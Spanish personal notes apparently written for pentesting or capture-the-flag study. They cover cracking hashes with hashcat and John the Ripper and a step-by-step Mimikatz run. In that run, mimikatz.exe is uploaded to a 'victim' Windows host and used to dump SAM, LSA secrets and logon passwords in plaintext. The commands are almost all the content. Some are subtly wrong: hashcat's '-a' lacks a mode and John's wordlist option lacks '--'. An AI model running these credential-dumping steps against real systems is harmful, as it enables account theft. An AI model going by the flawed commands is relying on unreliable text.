# Hashes y Desencriptación

Propietario: Adrian Gisbert Cabello

Para desencriptar un HASH podemos usar varias herramientas:

- HASHCAT
    
    Creamos un archivo .txt para alojar el hash (***nano hash.txt***), guardamos dentro el hash, salimos y usamos el siguiente comando: `hashcat -m 400 -a hash.txt /usr/share/wordlists/rockyou.txt` → `hashcat -m 400 -a hash.txt /usr/share/wordlists/rockyou.txt --show` (para ver la contraseña que ha crackeado). 
    
    Si no funcionan los comandos usar `hashcat -help` para ver que comando tenemos que poner.
    

- JOHN THE RIPPER
    
    Para crackear el hash lo guardamos en un archivo ***hash.txt*** (por ejemplo), y mediante la herramienta ***john*** ponemos el siguiente comando: `john --format=NT hash.txt wordlist=/usr/share/wordlists/rockyou.txt`	(el formato, hay que poner el que tenga el hash)
    
- MIMIKATZ
    
    Hacemos un upload del archivo mimikatz.exe de nuestra máquina linux al equipo víctima (en este caso Win x64):
    
    `cd C:\\` (Nos vamos al directorio raíz)
    
    `mkdir Temp` (Creamos una carpeta temporal para poder trabajar)
    
    `cd Temp`
    
    `upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe` (Directorio donde se encuentra el archivo en nuestra máquina Kali)
    
    `shell` (Abrimos una consola de comandos)
    
    `.\mimikatz.exe`
    
    Una vez estamos dentro de Mimikatz:
    
    `lsadump::sam` (Nos da más información que `Kiwi`)
    
    `lsadump::secrets`
    
    `sekurlsa::logonpasswords` (Ver contraseñas en texto plano, si procede)